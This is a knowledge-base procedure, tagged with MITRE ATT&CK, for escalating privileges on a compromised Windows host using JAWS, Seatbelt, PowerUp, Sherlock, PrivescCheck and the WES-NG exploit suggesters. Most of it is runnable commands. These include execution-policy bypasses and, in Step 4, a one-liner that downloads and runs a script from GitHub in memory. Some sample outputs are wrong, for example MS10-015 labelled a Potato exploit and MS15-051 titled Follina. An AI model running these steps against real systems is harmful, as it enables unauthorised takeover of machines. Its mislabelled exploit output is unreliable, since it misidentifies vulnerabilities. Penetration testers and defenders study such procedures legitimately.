---
id: 9e0e771c-4e3d-429a-aa96-fcfc8863c902
name: windows-privilege-escalation-using-powerup-privesccheck-and-wes-ng
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:28.533774+00:00'
updated_at: '2023-04-10T20:37:50.950310+00:00'
tactics:
  - '[[tactics/Persistence|TA0003 - Persistence]]'
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - '[[techniques/Event Triggered Execution|T1546 - Event Triggered Execution]]'
  - >-
    [[techniques/Exploitation for Privilege Escalation|T1068 - Exploitation for
    Privilege Escalation]]
sub_techniques:
  - >-
    [[sub-techniques/Windows Management Instrumentation Event
    Subscription|T1546.003 - Windows Management Instrumentation Event
    Subscription]]
tags:
  - '[[tags/Tools]]'
  - '[[tags/Windows - Privilege Escalation]]'
commands:
  - '[[commands/execute-jaws-enumeration]]'
  - '[[commands/obtain-system-information]]'
  - '[[commands/run-privesccheck-basic]]'
  - '[[commands/run-privesccheck-extended]]'
  - '[[commands/run-privesccheck-report]]'
  - '[[commands/scan-exploits-windows-exploit-suggester]]'
  - '[[commands/seatbelt-all-full-checks]]'
  - '[[commands/seatbelt-remote-checks]]'
  - '[[commands/seatbelt-system-output-file]]'
  - '[[commands/update-wes-ng]]'
  - '[[commands/update-windows-exploit-suggester]]'
platforms:
  - Windows
tools:
  - '[[tools/PowerUp]]'
  - '[[tools/PrivescCheck]]'
  - '[[tools/WES-NG]]'
  - '[[tools/SeatBelt]]'
  - '[[tools/JAWS]]'
  - '[[tools/Sherlock]]'
  - '[[tools/Windows-Exploit-Suggester]]'
validated: true
---

# windows-privilege-escalation-using-powerup-privesccheck-and-wes-ng

## Summary

This procedure outlines the use of multiple enumeration and vulnerability assessment tools—PowerUp, PrivescCheck, WES-NG, Seatbelt, JAWS, Sherlock, and Windows Exploit Suggester—to identify and exploit privilege escalation opportunities on Windows systems. It performs comprehensive system checks for misconfigurations, unpatched vulnerabilities, and weak permissions, enabling attackers to elevate from a low-privilege shell to SYSTEM or administrative access.

## Description

Privilege escalation on Windows involves leveraging misconfigurations, unpatched software, or weak access controls to gain higher privileges. This procedure chains tools for thorough enumeration: JAWS and Seatbelt for broad system surveys, PowerUp and Sherlock for specific checks like service vulnerabilities and missing patches, PrivescCheck for automated privilege checks, and WES-NG/Windows Exploit Suggester for suggesting kernel exploits based on system info. It targets Windows environments (e.g., Server 2008-2019) post-initial access, assuming a user-level shell. Outcomes include identified vectors like vulnerable services, scheduled tasks, or DLL hijacks, leading to potential exploitation for persistence and lateral movement.

## Requirements

1. Compromised access to a Windows system with PowerShell and Python 3 installed.
2. User-level credentials or shell (e.g., via initial access vector like phishing).
3. Network access to download tools/scripts if not pre-staged (e.g., GitHub repos).
4. Tools like [[tools/JAWS]], [[tools/SeatBelt]], [[tools/PowerUp]], [[tools/PrivescCheck]], [[tools/WES-NG]], [[tools/Sherlock]], and [[tools/Windows-Exploit-Suggester]] available or downloadable.

## Defense

- Apply regular patching via Windows Update to mitigate known exploits (e.g., monitor for MS vulnerabilities).
- Enable PowerShell logging (Module, ScriptBlock, Transcription) and monitor for suspicious executions.
- Implement AppLocker or WDAC to restrict unsigned scripts/tools; audit file permissions and service configurations.
- Use EDR tools to detect anomalous process spawning (e.g., powershell.exe downloading from GitHub) and network callbacks.

## Objectives

1. Enumerate system for privilege escalation vectors using multiple tools.
2. Identify exploitable misconfigurations, services, and unpatched vulnerabilities.
3. Generate reports and exploit suggestions to facilitate elevation to SYSTEM/admin privileges.

## Instructions

### Step 1: Enumerate System with JAWS

**Context**: JAWS (Just Another Windows (Enum) Script) performs comprehensive enumeration of users, groups, services, and configurations to uncover privesc paths. This step gathers baseline data for further analysis.

**Command** ([[commands/execute-jaws-enumeration]]):
```powershell
powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
```

> This executes the JAWS script, bypassing execution policy, and outputs results to JAWS-Enum.txt. Review the file for weak permissions, auto-runs, and credential exposures. If the script isn't local, download it first from its GitHub repo.

**Expected Output**: A detailed TXT report with sections on network info, services, scheduled tasks, and potential privesc vectors like writable service binaries.

### Step 2: Obtain System Information for Exploit Suggesters

**Context**: Systeminfo provides OS version, patches, and hotfixes needed for tools like WES-NG to match against known exploits. This is a prerequisite for kernel-level privesc assessment.

**Command** ([[commands/obtain-system-information]]):
```cmd
systeminfo > systeminfo.txt
```

> Run systeminfo and redirect output to a file. This captures details like KB patches installed, which exploit suggesters use to identify applicable CVEs.

**Expected Output**: Text file with OS details, e.g., "OS Name: Microsoft Windows 7 Ultimate", installed hotfixes, and network config.

### Step 3: Update and Run WES-NG for Exploit Suggestions

**Context**: WES-NG (Windows Exploit Suggester Next Generation) analyzes systeminfo against a database of MS bulletins to suggest kernel exploits. Update first to ensure current data, then scan.

**Command** ([[commands/update-wes-ng]]):
```bash
python3 wes.py --update-wes
python3 wes.py --update
python3 wes.py systeminfo.txt
```

> Updates the tool's database and runs it against the captured systeminfo. This identifies unpatched vulnerabilities like MS10-015 for privesc.

**Expected Output**: List of potential exploits with CVE IDs, e.g., "Potential exploits: MS17-010 -> ETERNALBLUE (High)", including download links or PoC references.

### Step 4: Invoke PowerUp for Misconfiguration Checks

**Context**: PowerUp automates checks for common privesc issues like unquoted paths, weak services, and registry misconfigs. It downloads and runs remotely to avoid local staging.

**Code** ([[codes/powershell-download-and-run-powerup]]):
```powershell
powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
```

> This bypasses execution policy, downloads PowerUp.ps1, and runs all checks. It focuses on why: to detect exploitable services (e.g., via Get-ModifiableService) or scheduled tasks.

**Expected Output**: Console output with findings like "[+] Modifiable Service: BITS (Unquoted Path)", including exploitation commands.

### Step 5: Run Sherlock for Missing Patch Enumeration

**Context**: Sherlock scans for over 200 known privesc bugs by checking installed software and patches. Use it to quickly identify local exploits without manual CVE lookup.

**Code** ([[codes/powershell-execute-sherlock-for-privesc]]):
```powershell
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File Sherlock.ps1
```

> Executes Sherlock.ps1 in a clean PowerShell session. If local, ensure it's downloaded; otherwise, stage it. This step verifies patch status against its database.

**Expected Output**: Color-coded list of potential exploits, e.g., "MS10-015 Potato Exploit: Applicable (Missing KB)", with severity ratings.

### Step 6: Perform PrivescCheck for Automated Vulnerability Assessment

**Context**: PrivescCheck runs a suite of checks for privesc vectors like token manipulation or service exploits. Start with basic, then extended, and generate reports for analysis.

**Command** ([[commands/run-privesccheck-basic]]):
```powershell
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
```

> Loads and invokes basic checks. For extended: use [[commands/run-privesccheck-extended]]. For report: [[commands/run-privesccheck-report]]. Decision: If basic finds nothing, run extended.

**Expected Output**: Output like "Potential Privesc: SeImpersonatePrivilege -> RottenPotato", with exploitation guidance.

### Step 7: Execute Seatbelt for Security Safety Checks

**Context**: Seatbelt performs host surveys for offensive/defensive insights, checking groups like system info, credentials, and remote access. Run all, then targeted.

**Command** ([[commands/seatbelt-all-full-checks]]):
```cmd
Seatbelt.exe -group=all -full
```

> Runs comprehensive checks. For system output: [[commands/seatbelt-system-output-file]]. For remote: [[commands/seatbelt-remote-checks]] with creds. This reveals weak ACLs or exposed hashes.

**Expected Output**: Structured output, e.g., "Group: System Information - Hotfixes: KB1234567 Installed", flagging risks like outdated components.

### Step 8: Update and Scan with Windows Exploit Suggester

**Context**: Similar to WES-NG, this tool suggests exploits based on systeminfo and MS databases. Update to latest, then scan for additional vectors.

**Command** ([[commands/update-windows-exploit-suggester]]):
```bash
./windows-exploit-suggester.py --update
```

**Command** ([[commands/scan-exploits-windows-exploit-suggester]]):
```bash
./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt
```

> Updates the Python tool, then runs against systeminfo.txt using a database file. Cross-reference with WES-NG for consensus on exploits.

**Expected Output**: Excel-like suggestions, e.g., "Exploit: MS15-051 - Title: Follina (Applicable)".
